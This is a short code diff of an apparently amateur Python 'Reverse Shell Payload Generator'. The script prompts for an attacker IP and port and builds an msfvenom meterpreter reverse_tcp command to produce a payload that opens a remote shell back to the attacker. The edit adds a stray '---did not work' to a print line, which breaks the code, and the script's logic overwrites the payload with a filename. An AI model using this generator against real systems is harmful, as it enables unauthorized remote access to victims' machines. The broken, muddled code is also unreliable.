@@ -32,7 +32,7 @@ import os
 import subprocess
 
 print("Welcome to the Reverse Shell Payload Generator")
-filename = input("Please enter the name of the file you want: ")
+filename = input("Please enter the name of the file you want for payload: ")
 
 # Get info from user
 attackerIP = input("Please enter the IP of the attacker machine: ")
@@ -59,4 +59,4 @@ elif osInfo.find("solarlis") !=-1:
 payload = "msfvenom -p "+os+"/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f raw"      
 print(payload)
 payload = filename
-print(payload)
+print(payload) ---did not work
